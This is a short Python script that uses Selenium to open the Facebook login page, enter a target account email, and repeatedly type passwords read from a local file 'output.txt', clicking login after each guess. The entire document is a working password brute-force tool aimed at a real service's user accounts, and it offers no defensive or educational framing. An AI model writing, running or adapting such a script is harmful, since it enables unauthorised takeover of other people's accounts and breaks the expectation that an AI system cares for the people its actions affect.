from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import hashlib
from urllib.request import urlopen
import time
import csv
chrome_options = Options()
chrome_options.add_experimental_option("detach", True)
URL = "https://facebook.com/login"


from webdriver_manager.chrome import ChromeDriverManager
driver = webdriver.Chrome(ChromeDriverManager().install(), options=chrome_options)

driver.get(URL)
time.sleep(10)
email = driver.find_element(By.ID, "email")
email.send_keys("") # add acount email


while True:
	time.sleep(5)
	with open("./output.txt", 'r') as csvfile:
		readerObj = csv.reader(csvfile)
		for row in readerObj:
			print("------------")
			password = driver.find_element(By.ID, "pass")
			print(row)
			
			time.sleep(1)
			password.send_keys(row)
			button = driver.find_element(By.XPATH, '//*[@id="loginbutton"]').click()
			time.sleep(10)

		
